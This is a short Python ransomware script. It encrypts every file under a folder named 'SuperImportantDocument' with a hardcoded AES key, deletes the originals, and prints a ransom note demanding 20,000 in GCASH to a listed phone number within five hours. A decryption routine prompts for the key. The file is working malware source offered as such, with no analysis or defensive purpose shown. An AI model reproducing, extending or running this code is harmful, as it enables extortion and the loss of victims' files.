import os
import os.path
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import base64

def encrypt_file(in_filename, out_filename=None, chunk_size=64*1024):
    if not out_filename:
        out_filename = in_filename + ".enc"
    key = b'GrumpyC@tDoGSay5NoT0N0H!kuKiahma' 
    cipher = AES.new(key, AES.MODE_GCM)
    with open(in_filename, 'rb') as infile:
        plaintext = infile.read()
        ciphertext, tag = cipher.encrypt_and_digest(plaintext)
        with open(out_filename, 'wb') as outfile:
            outfile.write(cipher.nonce)
            outfile.write(ciphertext)
            outfile.write(tag)
    print("Encrypting " + in_filename + "...")

def decrypt_file(key, in_filename, out_filename=None, chunk_size=64*1024):
    if not out_filename:
        out_filename = os.path.splitext(in_filename)[0]
    with open(in_filename, 'rb') as infile:
        encrypted = infile.read()
        nonce = encrypted[:16]
        ciphertext = encrypted[16:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        decrypted = cipher.decrypt_and_verify(ciphertext[:-16], ciphertext[-16:])
    with open(out_filename, 'wb') as outfile:
        outfile.write(decrypted)
    print("Decrypting " + in_filename + "...")

def main():
    print("Your Files are ENCRYPTED! If you want to restore them, send me 20,000 in GCASH: 09627261552. If I don't receive the money whithin 5 hours, say bye to your files!!! -circle:>")
    try:
        # Looping through target files
        for root, dirs, files in os.walk('./SuperImportantDocument'):
            for file in files:
                path = os.path.join(root, file)
                # Check if the file is encrypted
                if path.endswith(".enc"):
                    key = input("Enter decryption key: ").encode('utf-8')
                    decrypt_file(key, path)
                    os.remove(path) # delete the encrypted file
                else:
                    encrypt_file(path)
                    os.remove(path) # delete the original file after encryption
    except Exception as e:
        print("Error:", e)

if __name__ == "__main__":
    main()
